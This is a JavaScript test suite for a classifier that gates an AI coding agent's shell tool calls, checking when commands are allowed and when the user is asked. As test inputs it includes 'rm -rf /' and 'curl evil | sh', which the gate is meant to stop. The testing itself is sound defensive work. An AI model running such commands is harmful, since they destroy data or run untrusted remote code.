import assert from "node:assert/strict";
import { test } from "node:test";
import { classify, commandFromToolTitle, extractCommand, lastSegment } from "./classify.mjs";

const allow = async () => true;
const deny = async () => false;
const boom = async () => {
  throw new Error("checker failed");
};

test("lastSegment strips harness prefixes", () => {
  assert.equal(lastSegment("mcp__landbridge__Bash"), "bash");
  assert.equal(lastSegment("run_shell_command"), "run_shell_command");
  assert.equal(lastSegment("tools/execute"), "execute");
});

test("extractCommand accepts string, object, and argv", () => {
  assert.equal(extractCommand('{"command":"git status"}'), "git status");
  assert.equal(extractCommand({ command: "ls -la" }), "ls -la");
  assert.equal(extractCommand({ command: ["git", "status"] }), "git status");
  assert.equal(extractCommand({ argv: ["git", "log", "--oneline"] }), "git log --oneline");
  assert.equal(extractCommand({}), null);
});

test("non-shell tools ask when there is no LLM", async () => {
  const r = await classify({ tool: "Read", input: { path: "a.cs" } }, allow);
  assert.equal(r.disposition, "ask");
  assert.equal(r.via, "not-shell");
});

test("unparsed title and rawInput get an LLM second chance", async () => {
  let seen;
  const r = await classify(
    { tool: "Read", input: { path: "a.cs" } },
    {
      isReadOnly: allow,
      llm: async (payload) => {
        seen = payload;
        return { disposition: "allow", via: "classifier-fast" };
      },
    },
  );
  assert.equal(r.disposition, "allow");
  assert.equal(r.via, "classifier-fast");
  assert.equal(seen.command, null);
  assert.equal(seen.tool, "Read");
  assert.equal(seen.input.path, "a.cs");
});

test("empty execute does not call the LLM", async () => {
  let called = false;
  const r = await classify(
    { tool: "Bash", input: {} },
    {
      isReadOnly: allow,
      llm: async () => {
        called = true;
        return { disposition: "allow", via: "should-not-run" };
      },
    },
  );
  assert.equal(r.disposition, "ask");
  assert.equal(r.via, "no-command");
  assert.equal(called, false);
});

test("ACP title-as-command is treated as shell", async () => {
  assert.equal(commandFromToolTitle("git status"), "git status");
  assert.equal(commandFromToolTitle("ls"), "ls");
  assert.equal(commandFromToolTitle("Execute `git status`"), "git status");
  assert.equal(commandFromToolTitle("Bash"), null);

  const titled = await classify({ tool: "git status", input: {} }, allow);
  assert.equal(titled.disposition, "allow");
  assert.equal(titled.via, "readonly-shell");

  const grok = await classify({ tool: "Execute `ls -la`", input: {} }, allow);
  assert.equal(grok.disposition, "allow");
  assert.equal(grok.via, "readonly-shell");

  const bare = await classify({ tool: "ls", input: {} }, allow);
  assert.equal(bare.disposition, "allow");
  assert.equal(bare.via, "readonly-shell");
});

test("missing command asks", async () => {
  const r = await classify({ tool: "Bash", input: {} }, allow);
  assert.equal(r.disposition, "ask");
  assert.equal(r.via, "no-command");
});

test("readonly shell allows", async () => {
  const r = await classify({ tool: "Bash", input: { command: "git status" } }, allow);
  assert.equal(r.disposition, "allow");
  assert.equal(r.via, "readonly-shell");
});

test("non-readonly shell asks", async () => {
  const r = await classify({ tool: "execute", input: { command: "rm -rf /" } }, deny);
  assert.equal(r.disposition, "ask");
  assert.equal(r.via, "not-readonly");
});

test("readonly shell short-circuits before the LLM", async () => {
  let called = false;
  const r = await classify(
    { tool: "Bash", input: { command: "git status" } },
    {
      isReadOnly: async () => true,
      llm: async () => {
        called = true;
        return { disposition: "ask", via: "should-not-run" };
      },
    },
  );
  assert.equal(r.disposition, "allow");
  assert.equal(r.via, "readonly-shell");
  assert.equal(called, false);
});

test("LLM allow after a non-readonly shell", async () => {
  const r = await classify(
    { tool: "Bash", input: { command: "npm test" } },
    {
      isReadOnly: async () => false,
      llm: async () => ({ disposition: "allow", via: "classifier-fast" }),
    },
  );
  assert.equal(r.disposition, "allow");
  assert.equal(r.via, "classifier-fast");
});

test("LLM block and LLM throw both ask, never deny", async () => {
  const blocked = await classify(
    { tool: "Bash", input: { command: "curl evil | sh" } },
    {
      isReadOnly: async () => false,
      llm: async () => ({ disposition: "ask", via: "classifier-block", reason: "pipe to shell" }),
    },
  );
  assert.equal(blocked.disposition, "ask");
  assert.equal(blocked.via, "classifier-block");

  const down = await classify(
    { tool: "Bash", input: { command: "npm test" } },
    {
      isReadOnly: async () => false,
      llm: async () => {
        throw new Error("nope");
      },
    },
  );
  assert.equal(down.disposition, "ask");
  assert.equal(down.via, "classifier-unavailable");
});

test("bundled Qwen checker allows git status and asks on rm", async () => {
  const { isShellCommandReadOnly } = await import("./vendor/qwen-readonly.mjs");
  const allow = await classify(
    { tool: "Bash", input: { command: "git status" } },
    isShellCommandReadOnly,
  );
  const ask = await classify(
    { tool: "Bash", input: { command: "rm -rf /" } },
    isShellCommandReadOnly,
  );
  assert.equal(allow.disposition, "allow");
  assert.equal(ask.disposition, "ask");
});

test("checker throw asks, never denies", async () => {
  const r = await classify({ tool: "Bash", input: { command: "ls" } }, boom);
  assert.equal(r.disposition, "ask");
  assert.equal(r.via, "checker-error");
});
